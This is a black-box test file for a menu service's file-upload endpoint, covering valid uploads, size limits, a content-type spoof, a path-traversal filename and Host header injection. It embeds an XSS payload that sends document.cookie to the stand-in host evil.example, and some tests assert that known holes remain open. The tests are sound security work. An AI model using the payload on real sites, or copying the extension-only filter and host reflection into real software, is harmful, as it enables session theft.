/**
 * BLACK-BOX functional tests - menu-service POST /api/upload (SE4030).
 * Tests the multer upload endpoint with valid/invalid/malicious files.
 */
import request from 'supertest';
import fs from 'fs';
import path from 'path';
import app from '../../src/app';
import { connectAndReset, disconnectDb } from '../helpers/db';

const api = request(app);

const UPLOAD_DIR = path.join(process.cwd(), 'uploads');

const PNG_1x1 = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
  'base64'
);

const HTML_PAYLOAD = Buffer.from(
  '<html><body><script>document.location="http://evil.example/?c="+document.cookie</script>HACKED</body></html>'
);

beforeAll(async () => {
  await connectAndReset();
  if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
});

afterAll(async () => {
  await disconnectDb();
});

describe('BLACK-BOX /api/upload', () => {
  it('TC-BB-048 valid PNG upload -> 201 with url', async () => {
    const res = await api.post('/api/upload').attach('file', PNG_1x1, 'ok.png');
    expect(res.status).toBe(201);
    expect(res.body).toHaveProperty('url');
    expect(res.body.url).toMatch(/^http:\/\/.*\/uploads\//);
    if (res.body.filename) {
      const fp = path.join(UPLOAD_DIR, res.body.filename);
      if (fs.existsSync(fp)) fs.unlinkSync(fp);
    }
  });

  it('TC-BB-049 disallowed extension (.html) -> reject (400)', async () => {
    const res = await api.post('/api/upload').attach('file', HTML_PAYLOAD, 'evil.html');
    console.log('[BB-049] html upload returned:', res.status, JSON.stringify(res.body));
    expect(res.status).toBe(400);
  });

  it('TC-BB-050 NO file -> 400', async () => {
    const res = await api.post('/api/upload');
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('No file uploaded');
  });

  it('TC-BB-051 oversized file (>2MB) -> expect 400 (multer limit)', async () => {
    const big = Buffer.alloc(3 * 1024 * 1024, 1);
    const res = await api.post('/api/upload').attach('file', big, 'big.png');
    console.log('[BB-051] oversize upload returned:', res.status, JSON.stringify(res.body).slice(0, 200));
    expect(res.status).toBe(400);
  });

  it('TC-BB-052 HTML payload smuggled with image extension (content-type spoof) is ACCEPTED', async () => {
    const res = await api.post('/api/upload').attach('file', HTML_PAYLOAD, 'smuggled.png');
    console.log('[BB-052] html-in-png accepted:', res.status, JSON.stringify(res.body).slice(0, 250));
    expect(res.status).toBe(201); // extension-only filter => HTML content accepted
    if (res.body.filename) {
      const fp = path.join(UPLOAD_DIR, res.body.filename);
      if (fs.existsSync(fp)) {
        const contents = fs.readFileSync(fp, 'utf8');
        console.log('[BB-052] stored file content (first 80 bytes):', contents.slice(0, 80));
        fs.unlinkSync(fp);
      }
    }
  });

  it('TC-BB-053 traversal-style client filename is neutralised (random server name used)', async () => {
    const res = await api.post('/api/upload').attach('file', PNG_1x1, '../../../../../evil.png');
    console.log('[BB-053] traversal filename returned:', res.status, JSON.stringify(res.body));
    if (res.status === 201) {
      expect(res.body.filename).not.toContain('..');
      const fp = path.join(UPLOAD_DIR, res.body.filename);
      if (fs.existsSync(fp)) fs.unlinkSync(fp);
    }
  });

  it('TC-BB-054 Host header is reflected into returned URL (host header injection)', async () => {
    const res = await api
      .post('/api/upload')
      .set('Host', 'attacker.example')
      .attach('file', PNG_1x1, 'ok.png');
    console.log('[BB-054] returned url:', res.body.url);
    if (res.status === 201) {
      expect(res.body.url).toMatch(/^http:\/\/attacker\.example\/uploads\//);
      if (res.body.filename) {
        const fp = path.join(UPLOAD_DIR, res.body.filename);
        if (fs.existsSync(fp)) fs.unlinkSync(fp);
      }
    }
  });
});